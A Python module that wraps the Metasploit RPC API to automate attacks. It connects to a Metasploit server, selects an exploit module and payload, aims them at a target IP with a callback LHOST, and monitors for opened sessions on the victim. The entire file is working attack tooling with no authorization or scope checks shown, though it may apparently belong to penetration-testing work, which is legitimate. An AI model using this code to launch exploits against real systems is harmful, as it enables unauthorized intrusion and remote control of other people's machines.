from pymetasploit3.msfrpc import MsfRpcClient
import yaml
import time
import ssl

class MetasploitRPC:
    def __init__(self, config_path='config.yaml'):
        # Load configuration
        with open(config_path, 'r') as f:
            self.config = yaml.safe_load(f)
        
        msf_conf = self.config['metasploit']
        
        print(f"[*] Connecting to Metasploit RPC at {msf_conf['host']}:{msf_conf['port']}...")
        
        # Connect to Metasploit RPC
        self.client = MsfRpcClient(
            msf_conf['password'], 
            username=msf_conf['user'],
            server=msf_conf['host'],
            port=msf_conf['port'],
            ssl=msf_conf['ssl']
        )
        print("[+] Connected to Metasploit!")

    def check_module(self, module_name):
        try:
            return module_name in self.client.modules.exploits
        except Exception as e:
            print(f"[-] Error checking module {module_name}: {e}")
            return False

    def execute_exploit(self, exploit_data, target_ip, lhost):
        module_name = exploit_data['msf_module']
        payload_name = exploit_data['payload']
        rport = exploit_data['target_port']
        
        print(f"[*] Preparing {module_name} against {target_ip}...")
        
        exploit = self.client.modules.use('exploit', module_name)
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = rport
        
        payload = self.client.modules.use('payload', payload_name)
        payload['LHOST'] = lhost
        
        print(f"[*] Launching exploit... (Please wait)")
        
        job = exploit.execute(payload=payload)
        job_id = job['job_id']
        
        print(f"[*] Job {job_id} started. Monitoring for sessions...")
        time.sleep(5)
        
        sessions = self.client.sessions.list
        for s_id, session in sessions.items():
            if session['target_host'] == target_ip:
                print(f"[!!!] SUCCESS! Session {s_id} opened on {target_ip} ({session['type']})")
                return {"success": True, "session_id": s_id, "type": session['type']}
        
        print("[-] No session created. Exploit may have failed.")
        return {"success": False, "session_id": None}